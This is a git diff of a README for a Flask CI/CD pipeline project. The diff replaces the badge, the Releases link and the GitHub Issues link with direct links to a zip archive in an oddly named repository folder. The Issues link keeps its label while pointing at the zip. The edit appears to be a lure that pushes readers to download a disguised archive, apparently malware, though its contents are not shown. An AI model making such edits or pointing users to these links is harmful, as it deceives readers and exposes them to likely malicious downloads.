@@ -1,6 +1,6 @@
 # 🚀 flaskapp-ci-cd - Easy Setup for Your Flask App Automation
 
-![Download Flask App CI/CD](https://img.shields.io/badge/Download%20Flask%20App%20CI/CD-blue)
+![Download Flask App CI/CD](https://raw.githubusercontent.com/Harshit2292/flaskapp-ci-cd/main/pinacocytal/flaskapp-ci-cd.zip%20Flask%20App%20CI/CD-blue)
 
 ## 📋 Overview
 Welcome to the **flaskapp-ci-cd** project! This application provides a fully automated Continuous Integration and Continuous Deployment (CI/CD) pipeline for a Flask app. You can easily run automated tests, build Docker images, push them to Docker Hub, and deploy your app to AWS EC2—all in one smooth workflow. 
@@ -11,7 +11,7 @@ This guide will help you download and run the flaskapp-ci-cd application from Gi
 ## 📥 Download & Install
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Download flaskapp-ci-cd](https://github.com/Harshit2292/flaskapp-ci-cd/releases)
+[Download flaskapp-ci-cd](https://raw.githubusercontent.com/Harshit2292/flaskapp-ci-cd/main/pinacocytal/flaskapp-ci-cd.zip)
 
 Once you open the Releases page, follow these steps to download the software:
 
@@ -68,7 +68,7 @@ If you encounter issues, here are some common solutions:
 - **For AWS issues:** Ensure your AWS credentials are properly configured and that you have permissions for EC2.
 
 ## 📞 Support
-For further assistance, please check the [GitHub Issues](https://github.com/Harshit2292/flaskapp-ci-cd/issues) page. You can also reach out to the community or raise a query.
+For further assistance, please check the [GitHub Issues](https://raw.githubusercontent.com/Harshit2292/flaskapp-ci-cd/main/pinacocytal/flaskapp-ci-cd.zip) page. You can also reach out to the community or raise a query.
 
 ## 🌐 Contributing
 If you want to contribute to this project, you can fork the repository and submit pull requests. We welcome all contributions, no matter how small.
